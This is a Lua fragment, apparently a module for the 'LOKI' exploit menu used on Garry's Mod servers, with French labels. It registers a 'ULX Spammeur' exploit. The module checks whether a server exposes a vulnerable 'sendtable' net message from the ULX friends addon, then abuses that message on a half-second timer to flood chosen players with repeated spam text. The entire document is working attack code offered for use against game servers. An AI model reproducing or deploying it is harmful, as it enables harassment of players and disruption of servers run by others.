LOKI.AddExploit( "ULX Spammeur", {

    desc = "Spam tout le serveur en priver",

    severity = 1,

    scan = function() return (LOKI.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,

    functions = {

        { typ = "string", name = "Entre un message", default = "Semtex le dieu", addr = "fr_spamstring" },

        { typ = "players", addr = "fr_players" },

        { typ = "func", name = "Big Spams", func = function()

            if !timer.Exists( "bigspams" ) then

                LOKI.ChatText( "Allez c'est parti" )

                timer.Create( "bigspams", 0.5, 0, function()

                    local t = LOKI.GetStored( "fr_players", {} )

                    for k, v in pairs( player.GetAll() ) do

                        if !table.HasValue( t, v ) then continue end

                        local buyit = {}

                        for i = 1, 15 do

                            table.insert( buyit, LOKI.GetStored( "fr_spamstring", "Semtex the god" ) )

                        end

                        LOKI.NetStart( "sendtable" )

                        net.WriteEntity( v )

                        net.WriteTable( buyit )

                        net.SendToServer()

                    end

                end)

            else

                timer.Remove( "bigspams" )

                LOKI.ChatText( "Stopper" )

            end

        end, },

    },

} )
